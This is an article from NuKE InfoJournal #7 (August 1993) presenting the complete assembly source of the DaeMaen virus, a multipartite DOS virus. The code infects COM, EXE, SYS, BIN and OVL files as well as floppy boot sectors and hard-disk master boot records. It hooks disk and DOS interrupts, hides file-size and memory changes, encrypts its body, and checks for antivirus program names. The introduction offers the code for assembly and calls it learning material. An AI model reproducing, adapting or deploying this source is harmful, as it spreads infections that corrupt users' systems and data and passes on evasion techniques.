;===============================================================================
;         NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE
;         uK                                                       E-
;         E-            "The DaeMaen Virus Source Code"            Nu
;         Nu                                                       KE
;         KE                                                       -N
;         -N     Article By                   Virus By             uK
;         uK    Rock Steady                    TaLoN               E-
;         E-                                                       Nu
;         E-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-NuKE-Nu
;
;NuKE InfoJournal #7
;August 1993
;
;
;Well, here it is, the DaeMaen virus...the binary has been out for quite a
;while now.  Two versions of DaeMaen exist; the source code presented here
;is from the first version.  The changes made in the second version were
;minor.  You'll need to assemble this with the A86 assembler.  It is *not*
;compatible with MASM or TASM due to some minor directive differences, but
;it can easily be modified to compiler under the more popular assemblers
;(we chose to present to you the original, untouched source code, straight
;from the author).
;
;It is an extremely nice piece of work, only 2k in size, quite tight for
;all that code (it does .COM, .EXE, .SYS, .BIN, .OVL, and boot sector
;infections).  However it is somewhat lacking:  some methods of infection
;are somewhat lacking, and I'm not too thrilled about the technique of
;infecting on file closes.  Nevertheless, I find it extrordinary learning
;material.
;
;                            Rock Steady/NuKE
;
;
;[Note:  TaLoN aka Terminator-Z is no longer with NuKE due to legal problems.
;After being investigated by Australian authorities for illegal activities
;totally unconnected to his role in NuKE, he decided to take the heat off
;himself by "turning in" members of NuKE for crimes that they never committed.
;It is sad to see such a fine programmer do something so dispicable and
;underhanded, and we at NuKE regret his decision.  We wish him all the best
;in the courts... -NM]
;
;
;-------------------------------- CUT HERE -------------------------------------
; D�eM��n Virus specifications:
;
; An extrodinary virus if we may say so. It is able to infect .COMs, .EXEs,
; .SYSs, .BINs, .OVLs, Floppy Boot Sectors, HD Master Boot Records.
;
; Infects files on executions, opens, ext opens, attribs, close & renames.
; Infected files will feature a simple Random key encryption routine.
;
; Stealth abilities range from, redirects read/write away from partition table
; "Dir", hides file size increase without CHKDSK fuckups
; Memory stealth, memory disappears from DOS's view without function calls
;
;                                       -January 28, 1993 -TaLoN

org 0

@tsrchk equ     0a7ceh                          ; fingerprint
@mbr    equ     9                               ; sector of original MBR
@com_exe equ    0
@sys    equ     1
@JO     equ     070h                            ; JO operand for variable branch
@JMPS   equ     0ebh                            ; JMP SHORT (as above)
@RET    equ     0c3h                            ; RET for encrypt shit

p_len   equ     3072/16                         ; 3k in paragraphs

v_start:

syshead db      18 dup 90h                      ; header for SYS infection

                push ax
                push cx
                push si
                push ds
                push bp
                call encr_decr

e_start:        cld
                call $+3
                pop si
                sub si, $-1
                mov bp, es

branch:         jo sys_entry

com_exe_entry:  add sp, 10                      ; fuck off other registers
                call chk
                jz get_lost
                jmp domem
pre_gl:         xor si, si

get_lost:       mov es, bp                      ; exit without fingerprints
                push cs
                pop ds
                add si, offset old_shit
gl:             jo exit_exe
                mov di, 0100h
                push bp
                push di
                movsw
                movsb
                jmp short zero_shit
exit_exe:       add bp, 10h
                lodsw
                add ax, bp
                xchg ax, bx
                lodsw
                mov ss, bx
                xchg ax, sp
                lodsw
                xchg ax, bx
                lodsw
                add ax, bp
                push ax
                push bx
                sub bp, 10h

zero_shit:      xor ax, ax                      ; clean our hands
                mov bx, ax
                mov cx, ax
                mov dx, ax
                mov si, ax
                mov di, ax
                mov ds, bp
                mov bp, ax
                retf                            ; I didn't see nothin'

sys_entry:      ;int 05                          ; for debugger
                mov ax, word ptr [si+old_shit]
                mov word ptr [6], ax            ; restore INTR address
                push ax
                push bx
                push dx
                push di
                push es
                push ax
                call chk
                pop ax
                jz go_sys_exit
                push ax

                mov cx, si
                push si
                lea ax, [si+4096]
                mov bx, 10h
                xor dx, dx
                div bx
                inc ax                          ; align on paragraph boundary
                mov bx, cs
                add ax, bx
                mov es, ax
                xor si, si
                xor di, di
                rep movsb                       ; move the driver up in memory

                push cs
                pop es
                xor di, di
                mov cx, v_len
                mov bx, offset sys_00
                jmp move_us
go_sys_exit:    jmp short sys_exit
sys_00:         push ax
                mov ax, cs
                inc ah
                mov es, ax
                mov bp, ax
                pop ds
                xor si, si
                mov di, si
                pop cx
                rep movsb                       ; move SYS to final resting place
                push es
                pop ds
                push cs
                pop es
                xor si, si
                mov di, si
                mov cx, 9
                rep movsw                       ; copy their header

                xor si, si
                push cs
                pop ds
                call dms                        ; do some hooking shit
                pop ax
                mov word ptr [strat_1], ax
                mov word ptr [strat_1+2], bp
                mov word ptr [intr_1+2], bp
                mov ax, word ptr [8]
                mov word ptr [intr_1], ax
                mov word ptr [6], offset strat  ; hehe trick DOS
                mov word ptr [8], offset intr

                stc
sys_exit:       pop es
                pop di
                pop dx
                pop bx
                pop ax

                pop bp                          ; restore registers
                pop ds
                pop si
                pop cx
                pop ax
                jc sys_exit_2
                push word ptr cs:[6]
                ret
sys_exit_2:     jmp strat

        db      '[D�eM��n] by T�L�N-{N�K�}'

new13:          ; check for floppy access
                ; check for hd read sector 1
                cmp ax, @tsrchk
                jne n13_2
                xchg ax, bx
                push cs
                pop es
                iret
n13_2:          push ax
                shr ah, 1
                cmp ah, 1
                jne exit13
                cmp dl, 80h
                jb do_floppy
                ja exit13
                or dh, dh                       ; head 0?
                jnz exit13
                cmp cx, 1                       ; sector 1?
                ja exit13
                pop ax
                cmp ax, 0309h                   ; writing a few sectors?
                jae e13                         ; yeah.. let him
                call save
                push ax
                mov al, 1                       ; give him the "real" MBR
                mov cx, @mbr
                call i13

                pop ax
                dec al                          ; and read the rest of
                or al, al                       ; what he wants
                jz hd_done1

                add bx, 200h
                call i13
                sub bx, 200h

hd_done1:       call restore                    ; no sectors left
                clc
                inc ax
                xor ah, ah                      ; status=no error
                retf 2

gorestore:      call restore
exit13:         pop ax
e13:            jmp bypass

do_floppy:      call save
                xor ax, ax
                mov ds, ax
                inc dl
                test byte ptr [43fh], dl        ; drive still spinning?
                jnz gorestore                   ; yeah, don't reinfect
                dec dl
                call gooknuke
                call eat_floppy
                jmp short gorestore


new13_2:        ; the guts of multipartite infection
                ; check to see if i21 has changed... if so, hook it
                call save
                push cs
                pop es
                xor ax, ax
                mov ds, ax
                mov si, 21h*4
                mov di, offset oldvect+8
                cld
                cmpsw
                je nochange
                cmpsw
                je nochange
                call capture_21
                push cs
                pop ds
                mov si, offset oldvect+0        ; copy over saved shit so that
                lea di, [si+4]                  ; our i13 doesn't call here
                movsw                           ; any more [i21 has been hooked]
                movsw
nochange:       call restore
                jmp dword ptr cs:[oldvect+0]

        db      'Hugs to Sara Gordon'           ; get her agro

new21:          ; guts
                cmp ah, 11h                     ; FIND_FIRST
                je go_kstealth
                cmp ah, 12h                     ; FIND_NEXT
                je go_kstealth
                cmp ah, 3ch                     ; CREAT
                je create
                cmp ah, 3dh                     ; OPEN
                je letsgo
                cmp ah, 3eh                     ; CLOSE
                je close
                cmp ah, 43h                     ; ATTRIB
                je letsgo
                cmp ax, 4b00h                   ; EXEC
                je letsgo
                cmp ah, 56h                     ; RENAME
                je letsgo
                cmp ah, 6ch                     ; EXT_OPEN
                jne n21_2
                push dx
                mov dx, si
                call infect
                pop dx
                jmp short n21_2
letsgo:         call infect
n21_2:          jmp dword ptr cs:[oldvect+8]

file_end:       mov ax, 4202h
                jmp short seek_vals
file_zero:      mov ax, 4200h
seek_vals:      xor cx, cx
                xor dx, dx
i21:            pushf
                push cs
                call n21_2
                ret

go_kstealth:    jmp short kstealth

create:         call i21                        ; go create the file
                jc creat_exit                   ; successful?
                mov word ptr cs:[handle], ax    ; save handle
                call save
                call save_name
                call restore
creat_exit:     retf 2

close_r dw      offset creat_exit
close:          push word ptr cs:[close_r]
                call i21
                jc close_exit
                cmp word ptr cs:[handle], bx    ; the one we've got stored?
                jne close_exit
                call save
                jmp infect_2                    ; external entry
go_ce:          call restore
close_exit:     ret                             ; exit with current flagz

kstealth:       ; stole some of this from Mutating Rocko, mine wouldn't
                ; quite work right!  but I have changed it substantially..

                call i21
                or      al,al           ;Good FCB?
                jnz     no_good         ;nope
                push    ax
                push    bx
                push cx
                push ds
                push    es
                mov     ah,51h          ;Is this Undocmented? huh...
                call    i21

                mov     es,bx
                cmp     bx,es:[16h]
                jnz     not_infected    ;Not for us man...
                mov     bx,dx
                mov     al,[bx]
                push    ax
                mov     ah,2fh          ;Get file DTA
                call i21

                pop     ax
                inc     al
                push es
                pop ds
                jnz     fcb_okay
                add     bx,7h
fcb_okay:       mov ax, [bx+19h]
                mov cl, 9
                shr ax, cl
                cmp ax, 100                     ; 100 years more than expected?
                jb not_infected

                mov cx, 1
                cmp word ptr [bx+9], 'YS'       ; is it a SYS file?
                jne subtract
                cmp byte ptr [bx+11], 'S'
                jne subtract
                inc cx                          ; take twice as much from SYS
subtract:       sub word ptr [bx+1dh], v_len
                sbb word ptr [bx+1fh], 0
                loop subtract

not_infected:   pop     es
                pop ds
                pop cx
                pop     bx
                pop     ax
no_good:        iret


infect:         call save
                call save_name
infect_2:       call gooknuke                   ; DS=ES=CS
                call namechk
                jc go_bitch
                mov byte ptr [infected], 0      ; reset date change flag
                mov byte ptr [branch], @JO

                mov ax, 3524h
                call i21
                push es
                push bx
                mov dx, offset no_good          ; use the IRET from stealth bit
                mov ax, 2524h
                call i21                        ; disable Critical Error Handler
                push cs
                pop es

                mov dx, offset filename
                mov ax, 4300h
                call i21                        ; get attribs
                push cx
                mov ax, 4301h
                xor cx, cx
                call i21
                pop cx
                jc go_bitch1
                push cx
                
                mov ax, 3d02h
                mov dx, offset filename
                call i21                        ; open read/write
                jc bitch2
                xchg ax, bx
                mov ax, 5700h
                call i21
                push cx
                push dx
                xchg ax, dx
                mov cl, 9
                shr ax, cl
                cmp ax, 100                     ; 100 years more than expected?
                pop dx
                pop cx
                jae bitch3
                push cx
                push dx
                mov dx, offset signature
                mov ah, 3fh
                mov cx, 24
                call i21                        ; load header
                xor ax, cx                      ; file too small?
                jnz bitch4
                mov si, dx

                lodsb
                cmp al, 'M'
                je goexe                        ; it's an EXE
                cmp al, 'Z'
                je goexe
                cmp byte ptr [itype], @sys      ; is it a SYS file?
                je gosys
                jmp short gocom
go_bitch:       jmp short bitch
go_bitch1:      jmp short bitch1
bitch4:         pop dx
                pop cx
                cmp byte ptr [infected], 0      ; has the file been infected?
                je set4
                add dh, 0c8h                    ; add 100 years to date
set4:           mov ax, 5701h
                call i21
bitch3:         mov ah, 3eh
                call i21                        ; close file
bitch2:         push cs
                pop ds
                pop cx
                mov ax, 4301h
                mov dx, offset filename
                call i21                        ; reset attribs
bitch1:         pop dx
                pop ds
                mov ax, 2524h
                call i21
bitch:          call restore
                ret

goexe:          call exeinf
                jmp short bitch4
gocom:          call cominf
                jmp short bitch4
gosys:          call sysinf
                jmp short bitch4

cominf:         mov di, offset old_shit
                stosb
                movsw                           ; save first 3 bytes
                call file_end
                or dx, dx
                jnz com_done
                cmp ax, 0f000h                  ; COM too big?
                jae com_done
                add ax, 15                      ; bypass SYS fill
                push ax
                mov byte ptr [gl], @JO
                call write_us
                mov di, offset signature
                mov al, 0e9h
                stosb
                pop ax
                stosw
                jmp write_head
com_done:       ret

        db      'Hey John! If this is bad, wait for [VCL20]!'

exeinf:         call file_end
                push ax                         ; check for internal overlays
                push dx
                mov ax, word ptr [page_cnt]
                mov cx, 512
                mul cx
                pop cx
                pop bp
                cmp ax, bp
                jb com_done
                cmp dx, cx
                jb com_done

                mov di, offset old_shit
                mov si, offset relo_ss
                movsw
                movsw
                lodsw
                movsw
                movsw                           ; save the old shit

                call file_end

                mov byte ptr [gl], @JMPS
                mov cx, 10h                     ; # of paragraphs in whole file
                div cx
                sub ax, word ptr [hdr_size]     ; except the header
                mov word ptr [relo_cs], ax
                add dx, 18                      ; skip SYS fill
                mov word ptr [exe_ip], dx
                add dx, offset vstack+32        ; set up a stack
                mov word ptr [exe_sp], dx
                mov word ptr [relo_ss], ax
                call write_us

                mov cx, 512                     ; calculate new # of code pages
                div cx
                or dx, dx                       ; any bits left over?
                jz fp2
                inc ax                          ; yes, inc # pages to accommodate
fp2:            mov word ptr [part_page], dx
                mov word ptr [page_cnt], ax
                jmp write_head

sysinf:         dec si
                lodsw
                or ax, ax                       ; we'll only do files
                jz sys_ok                       ; starting with 0000 or FFFF
                inc ax                          ; (this excludes CONFIG.SYS)
                jz sys_ok
                ret
sys_ok:         mov si, offset signature+6
                mov di, offset old_shit
                movsw                           ; save old INTR offset
                call file_end
                add ax, 18                      ; skip SYS header shit
                mov word ptr [si-2], ax

                mov byte ptr [branch], @JMPS
                call write_us
                xor cx, cx
                mov dx, v_len                   ; file size increase = v_len*2
                mov ax, 4201h
                call i21
                mov ah, 40h
                call i21                        ; write 0 bytes
                                                ; (extend file to pointer)
write_head:     call file_zero
                mov dx, offset signature
                mov cx, 24
                mov ah, 40h
                call i21                        ; write the header
                mov byte ptr [infected], 1
                ret

eat_hd:         ; infect HD partition table
                ; assumes DS=ES=CS
                mov ax, 0201h
                mov bx, offset signature
                mov cx, 1
                mov dx, 80h
                call i13
                cmp word ptr [signature+2], @tsrchk
                je hd_done
                mov cx, @mbr                    ; sector 9
                mov ah, 3
                call i13
                mov di, bx
                mov word ptr [drv+1], 80h
                mov word ptr [sec+1], @mbr      ; original MBR
                mov si, offset kmart_kode
                mov cx, k_len
                rep movsb
                inc cx
                mov ah, 3
                mov byte ptr [residence], 1
                call i13
                mov ax, 0304h
                xor bx, bx
                mov cx, 10
                call i13
hd_done:        ret


eat_floppy:     ; do boot sector

                mov ax, 0201h
                mov bx, offset boot_sect
                mov cx, 1                       ; track 0 sector 1
                xor dh, dh                      ; head 0
                call i13

                lea si, [bx+3]
                mov cx, 8
kloop1:         lodsb
                cmp al, ' '
                jb nope
                cmp al, 'z'
                ja nope
                loop kloop1

; more complex than need be, to allow for old formats as well as new formats..
; it will check to see if it will cross a track boundary; if so, then it won't
; infect the disk.

                call calcsect
                push cx
                sub word ptr [totsecs], 5
                call calcsect
                pop ax
                sub ax, cx                      ; overrun track boundary?
                add al, 4
                jnz nope                        

                push dx
                xor dl, dl
                mov word ptr [drv+1], dx        ; drive 0.. on boot remember
                mov word ptr [sec+1], cx
                mov ax, 0301h
                mov bx, offset boot_sect
                pop dx
                call i13                        ; write it
                jc nope

                mov word ptr [oem+6], @tsrchk   ; fuck it up a bit
                                                ; so we don't reinfect it later
                inc cx
                mov ax, 0304h                   ; write virus code [4 sectors]
                xor bx, bx
                mov byte ptr [residence], 0
                call i13                        ; write ourselves

                mov di, offset boot_sect
                push di
                mov ax, 034ebh
                stosw
                add di, 34h
                mov si, offset kmart_kode
                mov cx, k_len
                rep movsb                       ; patch boot sector
                pop bx
                inc cx
                mov ax, 0301h
                xor dh, dh
                call i13                        ; write patched boot sector
nope:           ret

calcsect:       push dx
                mov ax, word ptr [totsecs]      ; calculate track, head, sector
;                add ax, word ptr [hidnsecs]     ; of last sector
                xor dx, dx                      
                div word ptr [trksecs]
                mov cx, dx
                xor dx, dx
                div word ptr [headcnt]
                pop bx
                mov bh, dl
                push bx

                push cx                         ; remainder sectors
                mov cl, 6                       ; CH=track
                shl ah, cl
                pop cx
                add cl, ah                      ; bits 9 & 10 of track #
                mov ch, al                      ; sector
                pop dx
                ret

save_name:      push cs
                pop es
                mov di, offset filename
                push di
                mov si, dx
storename:      lodsb
                stosb
                or al, al
                jnz storename
                pop dx                          ; DS:DX = filename
                push cs
                pop ds
                ret

namechk:        mov si, offset filename
nc1:            lodsb
                or al, al
                jnz nc1
                mov dx, si
                sub dx, 4
                sub si, 12
                cmp si, offset filename
                jae McAssFuck
                mov si, offset filename
McAssFuck:      dec si                          ; check for McWanker's
                cmp si, dx                      ; ] uppercase
extchk:         scasw
                je extchk_2
                inc di
                loop extchk
ncexit_err:     stc                             ; nope
                ret
extchk_2:       lodsb
                and al, 0dfh
                scasb
                jne ncexit_err
                mov byte ptr [itype], @com_exe
                cmp di, offset residence
                jb ncexit
                mov byte ptr [itype], @sys      ; OK, it's a SYS file
ncexit:         clc
                ret

chkMcAsshole:   and ax, 0dfdfh
                cmp ax, 'CS'                    ; SCAN?
                je chkma_end
                cmp ax, 'LC'                    ; CLEAN?
                je chkma_end
                cmp ax, 'SV'                    ; VSHIELD?
                je chkma_end
                cmp ax, '-F'                    ; F-PROT?
chkma_end:      ret

        db      'For Dudley'

domem:          mov bx, offset pre_gl
                push bx
                mov ax, bp
                dec ax
memloop:        mov ds, ax
                cmp byte ptr [0], 'Z'
                je fixmem
                mov bx, ax                      ; keep previous block
                add ax, word ptr [3]            ; up to next MCB
                inc ax
                jmp short memloop
fixmem:         cmp word ptr [3], p_len*5       ; is block too small?
                jae fm_ok
                mov ds, bx                      ; yeah, use previous block
                xchg ax, bx
fm_ok:          sub word ptr [3], p_len
                add ax, word ptr [3]
                inc ax
                mov word ptr [12h], ax
                mov es, ax
                xor ax, ax
                mov ds, ax
                sub word ptr [413h], 3          ; TOM=TOM-3  (not necessary)
                push cs
                pop ds
                xor di, di
                mov cx, v_len
                cld
                rep movsb
gohi:           push es
                mov ax, offset dms              ; dms = Do More Shit
                push ax
                retf

dms:            mov ax, 70h
                mov ds, ax
                mov si, 1
scan:           dec si
                lodsw
                cmp ax, 1effh                   ; CS segment override qualifier?
                jne scan
                mov ax, 2cah                    ; RETF 2 opcode
                cmp [si+4], ax                  ; (double check)
                je right
                cmp [si+5],ax
                jne scan                        ; nope, try again
right:          lodsw                           ; get the actual storage address
                xchg ax, si
                push si
                mov di, offset oldvect+4
                movsw                           ; save the original i21 vector
                movsw
                pop si
                mov word ptr [si], offset go_n13
                mov word ptr [si+2], cs

do13_2:         push cs
                pop ds
                mov dx, 80h
                call eat_hd
                jnc go_ints                     ; hard drive infect fucked up?
                xor dx, dx                      ; yep, infect floppy instead
                call eat_floppy
go_ints:        call enable
                xor ax, ax
                mov ds, ax
                call capture_21
                push cs
                pop ds
                ret

        db      '[VCL20]'

write_us:       call file_end
                xor ax, ax
                int 1ah
                mov word ptr [key+1], dx
                mov di, offset eret
                mov cx, wheelchair_len
                mov si, offset wheelchair
                rep movsb                       ; move the temporary code
                mov byte ptr [go_n13], @JMPS    ; bypass new13
                call encr_decr
                call enable                     ; and re-enable it
                call file_end
                ret

; this wheelchair stuff is probably the most dodgey code in the whole virus...

wheelchair:     mov byte ptr [eret], @RET       ; repair the code
                mov ah, 40h
                mov cx, v_len
                xor dx, dx
                pushf
                call dword ptr cs:[oldvect+8]   ; write encrypted bitch
                mov ax, offset encr_decr
                call ax                         ; now decrypt ourselves! [hehe]
                ret
wheelchair_len equ $-wheelchair                 ; length of temp code

capture_13:     mov di, offset oldvect+4
                mov ax, offset go_n13
capture_13_2:   mov si, 13h*4
                xor dx, dx
                mov ds, dx
                call doint
                ret

capture_21:     mov si, 21h*4
                mov di, offset oldvect+8
                mov ax, offset new21
                call doint
                ret

doint:          mov cx, 2
d2:             xchg [si], ax
                stosw
                lodsw                           ; inc si by 2
                mov ax, cs
                loop d2
                ret

i13:            pushf                           ; simulate int 13h
                push cs
                call bypass
                ret

enable:         mov byte ptr [go_n13], @JO      ; restore jump to new13
                ret

save:           pop word ptr cs:[temp_jmp]      ; preserve registers
                pushf
                push ax
                push bx
                push cx
                push dx
                push si
                push di
                push ds
                push es
                push bp
                jmp word ptr cs:[temp_jmp]

restore:        pop word ptr cs:[temp_jmp]      ; and give them back
                pop bp
                pop es
                pop ds
                pop di
                pop si
                pop dx
                pop cx
                pop bx
                pop ax
                popf
                jmp word ptr cs:[temp_jmp]

gooknuke:       push cs
                pop ds
                push cs
                pop es
                ret


kmart_kode:     jmp short kkk3
        dw      @tsrchk                         ; infection marker
kkk3:           cli
                xor ax, ax
                mov ss, ax
                mov sp, 7c00h
                sti
                mov ds, ax

sec:            mov cx, 0
drv:            mov dx, 0
                push dx
ffq:            push cx

                call chk
                jz go69
                mov si, 412h
                add word ptr [si+1], -3         ; take 3k
                lodsb
                lodsw

                mov cl, 6
                shl ax, cl
                mov es, ax
                xor bx, bx
                mov ax, 0204h                   ; read us into high memory
                pop cx
                push cx
                inc cx
                int 13h
go69:           push es
                mov ax, offset disk_entry
                push ax
                retf

chk:            mov ax, @tsrchk
                int 13h
                xor bx, @tsrchk
                ret
k_len   equ     $-kmart_kode


disk_entry:     call chk
                jz de_exit
                mov di, offset oldvect+0
                mov ax, offset new13_2
                call capture_13_2
                call capture_13                 ; make new13 jump to new13_2
                mov si, 21h*4
                movsw
                movsw
                call gooknuke
                cmp byte ptr [residence], 1
                je de_exit
                mov dx, 80h
                call eat_hd
de_exit:        xor ax, ax
                mov es, ax
                pop cx
                pop dx
                mov bx, 7c00h
                push es
                push bx
                mov ax, 0201h
                int 13h
                retf

old_shit:       int 20h
        dw      0,0,0

exts    db      'COMEXEBINOVLSYS'               ; valid extensions

residence db    0                               ; 0=from floppy boot
                                                ; 1=from MBR


e_end:                                          ; end of encrypted data

strat:          push ax
                push ds
                lds ax, dword ptr cs:[strat_1]  ; trick the host driver
        db      9ah
strat_1 dd      0
                mov ax, word ptr [6]
                mov word ptr cs:[strat_1], ax   ; update pointer if changed
                jmp short sys_return            ; (cater for other infections)

intr:           push ax
                push ds
                lds ax, dword ptr cs:[intr_1]
        db      9ah
intr_1  dd      0
                mov ax, word ptr [8]
                mov word ptr cs:[intr_1], ax
sys_return:     pop ds
                pop ax
                retf




go_n13:         jo bypass                       ; bypass new13 while encrypted
                jmp new13
bypass:         jmp dword ptr cs:[oldvect+4]



move_us:        rep movsb                       ; this must be here in case it's
                ;int 05
                jmp bx                          ; a very small SYS file, so the
                                                ; move doesn't hang the system

encr_decr:      push cs
                pop ds
                call $+3
faewq:          pop si
                sub si, offset faewq - e_start
                mov cx, (e_len)-1
key:            mov ax, 0                       ; harmless so far
dloop:          xor word ptr [si], ax
                inc si
                inc al                          ; yeah wreck the key
                dec ah
                loop dloop
eret:           ret                             ; this code gets changed to
                                                ; write the virus to file

v_end:

; wheelchair code goes here

itype   equ     $+wheelchair_len
infected equ    itype + 2
temp_jmp equ    infected + 1
oldvect equ     temp_jmp + 2                    ;        +0  old i13
                                                ;        +4  multipartite handler
                                                ;        +8  old i21
signature equ   oldvect + 12
part_page       equ signature + 2       ; part-page at EOF
page_cnt        equ part_page + 2       ; count of code pages
hdr_size        equ page_cnt + 4        ; size of header in paragraphs
relo_ss         equ hdr_size + 6        ; displacement of stack segment (SS)
exe_sp          equ relo_ss + 2         ; stack pointer (SP)
chksum          equ exe_sp + 2          ;
exe_ip          equ chksum + 2          ; instruction pointer (IP)
relo_cs         equ exe_ip + 2          ; displacement of code segment (CS)
                                        ; 24 bytes
vstack          equ relo_cs + 2         ; temp stack for EXE file
handle          equ relo_cs + 2         ; save for file handle on Create
filename        equ handle + 2          ; filename of target file

boot_sect       equ relo_cs + 100       ; as not to overwrite things by accident
oem             equ boot_sect + 3
sectsize        equ oem + 8
clustsize       equ sectsize + 2
ressecs         equ clustsize + 1
fatcnt          equ ressecs + 2
rootsiz         equ fatcnt + 1
totsecs         equ rootsiz + 2
media           equ totsecs + 2
fatsize         equ media + 1
trksecs         equ fatsize + 2
headcnt         equ trksecs + 2
hidnsecs        equ headcnt + 2

v_len   equ     v_end - v_start

e_len   equ     e_end - e_start

------------------------------- CUT HERE ---------------------------------------
================================================================================

